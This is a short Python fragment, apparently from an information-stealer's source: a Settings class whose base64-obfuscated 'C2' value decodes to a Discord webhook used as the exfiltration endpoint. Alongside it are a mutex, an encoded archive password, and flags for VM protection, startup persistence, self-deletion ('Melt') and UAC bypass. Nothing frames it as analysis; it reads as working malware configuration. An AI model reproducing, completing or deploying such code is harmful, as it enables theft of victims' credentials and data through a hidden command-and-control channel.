...
class Settings:
    C2 = (0, base64.b64decode('aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTIyNDg5NjM3MjM4MjEwOTcxNi8zQXY2ZzlEblV1ZzBKVTZBQnU3VGE3SEloRHVMUlQyS20tZ01teWFmaXZoYXp1Ny02MmlCN0FvRmEzRW0yOWczUGJXOQ==').decode())
    Mutex = base64.b64decode('TUlNbWJCbDg5SWZpcU1nZg==').decode()
    PingMe = bool('true')
    Vmprotect = bool('true')
    Startup = bool('')
    Melt = bool('')
    UacBypass = bool('')
    ArchivePassword = base64.b64decode('R3JleUJyaWNr').decode()
